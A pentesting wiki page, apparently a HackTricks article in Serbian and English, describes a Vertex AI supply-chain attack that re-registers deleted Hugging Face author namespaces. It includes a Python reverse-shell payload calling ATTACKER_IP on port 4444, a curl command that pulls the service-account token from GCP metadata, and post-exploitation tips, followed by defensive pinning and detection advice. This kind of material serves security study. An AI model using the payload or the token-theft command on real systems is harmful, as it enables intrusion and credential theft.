# GCP - Vertex AI Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## Scenarij

- Vertex AI Model Garden omogućava direktno postavljanje mnogih Hugging Face (HF) modela.
- HF model identifiers are Author/ModelName. Ako je author/org na HF obrisan, isto ime autora može ponovo registrovati bilo ko. Napadači potom mogu kreirati repo sa istim ModelName na legacy path.
- Pipelines, SDKs, or cloud catalogs koji povlače resurse samo po imenu (bez pinovanja/integriteta) će povući attacker-controlled repo. Kada se model deploy-uje, loader code iz tog repo-a može se izvršiti unutar Vertex AI endpoint kontejnera, dajući RCE sa dozvolama endpointa.

Two common takeover cases on HF:
- Ownership deletion: Stari put vraća 404 dok neko ponovo ne registruje autora i ne objavi isti ModelName.
- Ownership transfer: HF issues 307 redirects sa starog Author/ModelName na novog autora. Ako stari autor kasnije bude obrisan i ponovo registrovan od strane napadača, redirect lanac je prekinut i attacker’s repo služi na legacy path.

## Identifying Reusable Namespaces (HF)

- Old author deleted: stranica autora vraća 404; model path može vraćati 404 dok ne dođe do takeover-a.
- Transferred models: stara putanja modela vraća 307 ka novom vlasniku dok stari autor postoji. Ako stari autor bude kasnije obrisan i ponovo registrovan, legacy path će pokazivati na attacker’s repo.

Quick checks with curl:
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>
# 200 = exists, 404 = deleted/available

# Check old model path behavior
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 = redirect to new owner (transfer case)
# 404 = missing (deletion case) until someone re-registers
```
## End-to-end tok napada protiv Vertex AI

1) Otkrivanje ponovo iskoristivih model namespace-ova koje Model Garden prikazuje kao deployable:
- Pronađite HF modele u Vertex AI Model Garden koji i dalje imaju oznaku “verified deployable”.
- Proverite na HF da li je originalni autor obrisan ili je model prebačen i stari autor naknadno uklonjen.

2) Ponovo registrovati obrisanog autora na HF i ponovo kreirati isti ModelName.

3) Objavite maliciozni repo. Uključite kod koji se izvršava pri učitavanju modela. Primeri koji se često izvršavaju tokom HF učitavanja modela:
- Side effects u __init__.py repoa
- Custom modeling_*.py ili processing kod na koji se poziva iz config/auto_map
- Code paths that require trust_remote_code=True u Transformers pipelines

4) Vertex AI deployment nasleđenog Author/ModelName sada povlači napadačev repo. Loader se izvršava unutar Vertex AI endpoint containera.

5) Payload uspostavlja pristup iz endpoint okruženja (RCE) sa privilegijama endpointa.

Example payload fragment executed on import (for demonstration only):
```python
# Place in __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # Or python -c exec ...

if os.environ.get("VTX_AI","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Napomene
- Loaders u stvarnom svetu variraju. Mnoge Vertex AI HF integracije kloniraju i importuju repo module koji su referencirani u model’s config (npr. `auto_map`), što može pokrenuti izvršavanje koda. Neke upotrebe zahtevaju `trust_remote_code=True`.
- Endpoint tipično radi u posvećenom containeru sa ograničenim opsegom, ali predstavlja validan početni foothold za pristup podacima i lateralno kretanje u GCP.

## Post-Exploitation Tips (Vertex AI Endpoint)

Kada kod radi unutar endpoint container-a, razmotrite:
- Enumerisanje environment varijabli i metadata za kredencijale/tokene
- Pristupanje prikačenom skladištu ili montiranim artefaktima modela
- Interakcija sa Google APIs koristeći identitet service account-a (Document AI, Storage, Pub/Sub, itd.)
- Perzistencija u artefaktu modela ako platforma ponovo povuče repo

Enumerišite instance metadata ako su dostupne (zavisno od containera):
```bash
curl -H "Metadata-Flavor: Google" \
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
## Odbrambene smernice za korisnike Vertex AI

- Pin models by commit u HF loaders da sprečite tihu zamenu:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Preslikajte proverene HF modele u pouzdano interno skladište/registar artefakata i raspoređujte ih odatle.
- Neprestano skenirajte kodne baze i konfiguracije zbog hardkodovanih Author/ModelName koji su izbrisani/prebačeni; ažurirajte na nove namespace-ove ili pinujte po commit-u.
- U Model Garden, verifikujte poreklo modela i postojanje autora pre raspoređivanja.

## Heuristike prepoznavanja (HTTP)

- Izbrisan autor: stranica autora vraća 404; nasleđena putanja modela vraća 404 dok ne dođe do preuzimanja.
- Prebačen model: nasleđena putanja vraća 307 ka novom autoru dok stari autor postoji; ako je stari autor kasnije obrisan i ponovo registrovan, nasleđena putanja poslužuje sadržaj napadača.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Međureferencije

- Pogledajte širu metodologiju i napomene o supply-chain:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Izvori

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
